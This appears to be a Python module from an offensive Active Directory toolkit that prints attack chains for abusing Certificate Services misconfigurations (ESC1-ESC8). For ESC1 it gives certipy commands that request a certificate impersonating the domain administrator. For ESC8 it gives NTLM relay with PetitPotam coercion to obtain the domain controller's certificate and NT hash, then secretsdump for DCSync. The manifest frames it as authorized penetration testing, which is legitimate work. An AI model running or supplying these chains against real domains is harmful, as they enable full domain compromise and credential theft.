"""AD CS abuse campaign  -  ESC1-ESC8 detection and exploitation chain."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.campaign.cert_abuse_chain.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["certificate_enrollment", "ntlm_relay"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1649"],
}

ESC_TECHNIQUES = {
    "ESC1": "Template allows SAN + low-priv enrollment → request cert as DA",
    "ESC2": "Template allows any purpose EKU → use for auth as anyone",
    "ESC3": "Enrollment agent template → request cert on behalf of DA",
    "ESC4": "Template ACL allows low-priv user to modify template → enable ESC1",
    "ESC6": "EDITF_ATTRIBUTESUBJECTALTNAME2 on CA → arbitrary SAN on any cert",
    "ESC7": "CA ACL allows ManageCA/ManageCertificates → approve pending + ESC6",
    "ESC8": "HTTP enrollment endpoint → NTLM relay to get cert as DC$",
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", args.target)
    esc = getattr(args, "esc", None)

    print(f"[*] AD CS Abuse Campaign → {args.domain}")
    print()

    if not esc:
        print("[*] Step 1: Enumerate with certipy/adcs_enum")
        print("[*] Step 2: Choose ESC technique:")
        for k, v in ESC_TECHNIQUES.items():
            print(f"  {k}  -  {v}")
        print("\n[*] Use --esc ESC1..ESC8 to execute specific technique")
        return 0

    esc = esc.upper()
    print(f"[*] Executing {esc} chain:")

    if esc == "ESC1":
        print("  1. certipy find -vulnerable → identify ESC1 template")
        print("  2. certipy req -u user@domain -p pass -target CA")
        print("     -template VulnTemplate -upn administrator@domain")
        print(f"  3. certipy auth -pfx administrator.pfx -dc-ip {dc_ip}")
    elif esc == "ESC8":
        print("  1. Start ntlmrelayx → http://CA/certsrv/certfnsh.asp")
        print("  2. Trigger coercion (PetitPotam/PrinterBug)")
        print("  3. Relay captures DC$ cert")
        print("  4. certipy auth -pfx dc.pfx → get DC$ NT hash")
        print("  5. secretsdump.py with DC$ hash → DCSync")
    else:
        desc = ESC_TECHNIQUES.get(esc, "Unknown ESC technique")
        print(f"  Technique: {desc}")
        print("  Use certipy for automated exploitation")

    return 0
